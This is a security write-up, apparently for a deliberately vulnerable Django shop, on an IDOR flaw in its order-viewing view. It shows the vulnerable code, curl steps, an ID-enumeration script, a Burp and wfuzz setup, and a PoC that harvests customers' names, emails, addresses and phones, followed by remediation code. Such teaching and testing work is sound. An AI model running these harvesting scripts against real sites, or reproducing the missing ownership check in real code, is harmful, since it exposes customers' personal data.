# Insecure Direct Object Reference (IDOR) Vulnerability Documentation

## Vulnerability Overview
**Type**: Broken Access Control - Insecure Direct Object Reference (IDOR)  
**Location**: Order viewing functionality (`/order/<order_id>/`)  
**File**: `eshop/views.py` - `view_order` function (lines 1007-1041)  
**Severity**: High  
**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-639 - Authorization Bypass Through User-Controlled Key  

## Technical Details

### Vulnerable Code
```python
@login_required
def view_order(request, order_id):
    """
    View order details - VULNERABLE TO IDOR
    
    WARNING: This view does NOT check if the order belongs to the logged-in user
    Allows viewing any order by changing the order_id parameter
    """
    
    # VULNERABILITY: No access control check
    # Should verify: order.user == request.user
    try:
        # Direct object reference without authorization check
        order = Order.objects.get(id=order_id)
        
        # Get order items
        order_items = order.orderitem_set.all()
        
        # VULNERABILITY: Exposing sensitive information
        context = {
            'order': order,
            'order_items': order_items,
            'shipping_address': order.shipping_address,
            'user_info': {
                'username': order.user.username,
                'email': order.user.email,
                'date_joined': order.user.date_joined
            }
        }
        
        return render(request, 'eshop/order_detail.html', context)
```

### Vulnerability Explanation
1. **No Authorization Check**: The view only checks if user is logged in, not if they own the order
2. **Direct Object Reference**: Order ID is taken directly from URL without validation
3. **Information Disclosure**: Exposes other users' personal and order information
4. **Predictable IDs**: Order IDs follow pattern `ORD-XXXXX-XXXXX` making enumeration easier

## Exploitation Steps

### 1. Manual Exploitation

**Step 1: Login as any user**
```bash
# Login to get a valid session
curl -c cookies.txt -X POST http://localhost:8000/login/ \
  -d "username=testuser&password=testpass123"
```

**Step 2: View your own orders to get ID pattern**
```bash
curl -b cookies.txt http://localhost:8000/my-orders/
# Note the order ID format: ORD-ABCDE-FGHIJ
```

**Step 3: Access other users' orders**
```bash
# Try different order IDs
curl -b cookies.txt http://localhost:8000/order/ORD-XXXXX-XXXXX/
curl -b cookies.txt http://localhost:8000/order/ORD-12345-67890/
```

### 2. Automated Enumeration Script

```python
import requests
import string
import random
from itertools import product

def generate_order_ids():
    """Generate possible order IDs based on pattern"""
    chars = string.ascii_uppercase + string.digits
    
    # Try common patterns
    for i in range(100):
        part1 = ''.join(random.choices(chars, k=5))
        part2 = ''.join(random.choices(chars, k=5))
        yield f"ORD-{part1}-{part2}"

def exploit_idor(session_cookie):
    """Enumerate and access orders"""
    session = requests.Session()
    session.cookies.set('sessionid', session_cookie)
    
    found_orders = []
    
    for order_id in generate_order_ids():
        url = f"http://localhost:8000/order/{order_id}/"
        response = session.get(url)
        
        if response.status_code == 200 and "Order Details" in response.text:
            print(f"[+] Found valid order: {order_id}")
            
            # Extract sensitive info
            if "Username:" in response.text:
                # Parse user info from response
                found_orders.append(order_id)
        
    return found_orders

# Usage
exploit_idor('your-session-id-here')
```

### 3. Burp Suite Intruder Attack

**Payload Configuration**:
```
GET /order/ORD-§XXXXX§-§YYYYY§/ HTTP/1.1
Host: localhost:8000
Cookie: sessionid=your-session-id

Payload 1: AAAAA-ZZZZZ (alphanumeric, 5 chars)
Payload 2: AAAAA-ZZZZZ (alphanumeric, 5 chars)
```

## Proof of Concept

### PoC Script - Order Data Harvester
```python
#!/usr/bin/env python3
"""
IDOR Exploitation PoC - Order Information Harvesting
"""

import requests
import re
from bs4 import BeautifulSoup

class IDORExploit:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.set('sessionid', session_cookie)
        
    def extract_order_info(self, order_id):
        """Extract sensitive information from order page"""
        response = self.session.get(f"{self.base_url}/order/{order_id}/")
        
        if response.status_code != 200:
            return None
            
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Extract user information
        user_info = {}
        username_elem = soup.find(text=re.compile('Username:'))
        if username_elem:
            user_info['username'] = username_elem.find_next().text.strip()
            
        email_elem = soup.find(text=re.compile('Email:'))
        if email_elem:
            user_info['email'] = email_elem.find_next().text.strip()
            
        # Extract shipping address
        address_info = {}
        for field in ['Name:', 'Address:', 'City:', 'Phone:']:
            elem = soup.find(text=re.compile(field))
            if elem:
                address_info[field.lower().strip(':')] = elem.find_next().text.strip()
                
        # Extract order total
        total_elem = soup.find(text=re.compile('Total Amount:'))
        total = total_elem.find_next().text.strip() if total_elem else 'Unknown'
        
        return {
            'order_id': order_id,
            'user': user_info,
            'shipping': address_info,
            'total': total
        }
    
    def harvest_orders(self, order_ids):
        """Harvest information from multiple orders"""
        harvested_data = []
        
        for order_id in order_ids:
            print(f"[*] Checking order: {order_id}")
            data = self.extract_order_info(order_id)
            
            if data:
                print(f"[+] Successfully harvested: {order_id}")
                print(f"    User: {data['user'].get('username', 'Unknown')}")
                print(f"    Email: {data['user'].get('email', 'Unknown')}")
                print(f"    Total: {data['total']}")
                harvested_data.append(data)
                
        return harvested_data

# Example usage
if __name__ == "__main__":
    # Login first to get session
    login_data = {'username': 'testuser', 'password': 'testpass123'}
    login_resp = requests.post('http://localhost:8000/login/', data=login_data)
    session_id = login_resp.cookies.get('sessionid')
    
    # Exploit IDOR
    exploit = IDORExploit('http://localhost:8000', session_id)
    
    # Try some order IDs
    test_orders = [
        'ORD-ABCDE-12345',
        'ORD-TEST1-TEST2',
        'ORD-DEMO1-DEMO2'
    ]
    
    harvested = exploit.harvest_orders(test_orders)
    print(f"\n[+] Harvested {len(harvested)} orders with personal data!")
```

## Impact Analysis

### Data Exposed
1. **Personal Information**
   - Full names
   - Email addresses
   - Phone numbers
   - Physical addresses
   - Account creation dates

2. **Order Information**
   - Order history
   - Purchase amounts
   - Product preferences
   - Shipping details

3. **Business Intelligence**
   - Total sales data
   - Customer base size
   - Order patterns
   - Popular products

### Attack Scenarios

#### Scenario 1: Competitor Intelligence
- Enumerate all orders to analyze sales volume
- Identify customer base and purchasing patterns
- Extract pricing and product information

#### Scenario 2: Identity Theft
- Harvest personal information for phishing
- Collect addresses for physical mail fraud
- Build profiles for social engineering

#### Scenario 3: Customer Harassment
- Access order history to harass customers
- Use phone numbers for spam calls
- Send phishing emails to harvested addresses

## Remediation

### Immediate Fix
```python
@login_required
def view_order(request, order_id):
    """Secure version with access control"""
    try:
        # FIXED: Check if order belongs to user
        order = Order.objects.get(id=order_id, user=request.user)
        
        # Rest of the code...
    except Order.DoesNotExist:
        # Generic error message
        messages.error(request, "Order not found or access denied.")
        return redirect('list_user_orders')
```

### Additional Security Measures

1. **Use UUIDs Instead of Sequential IDs**
```python
import uuid

class Order(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
```

2. **Implement Object-Level Permissions**
```python
from django.core.exceptions import PermissionDenied

def has_order_permission(user, order):
    if order.user != user and not user.is_staff:
        raise PermissionDenied
```

3. **Add Audit Logging**
```python
import logging

logger = logging.getLogger('security')

def view_order(request, order_id):
    logger.info(f"User {request.user.id} accessing order {order_id}")
    # Check permissions...
```

4. **Rate Limiting**
```python
from django_ratelimit.decorators import ratelimit

@ratelimit(key='user', rate='10/m', method='GET')
def view_order(request, order_id):
    # Prevents rapid enumeration
```

## Testing Commands

### Manual Testing
```bash
# Test with curl
curl -b "sessionid=valid-session-id" \
     http://localhost:8000/order/ORD-XXXXX-XXXXX/

# Test with different user's order
curl -b "sessionid=user1-session" \
     http://localhost:8000/order/USER2-ORDER-ID/
```

### Automated Testing with wfuzz
```bash
# Fuzz order IDs
wfuzz -c -z file,order_ids.txt \
      -b "sessionid=valid-session-id" \
      --hc 404 \
      http://localhost:8000/order/FUZZ/
```

## References
- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
- [PortSwigger IDOR](https://portswigger.net/web-security/access-control/idor)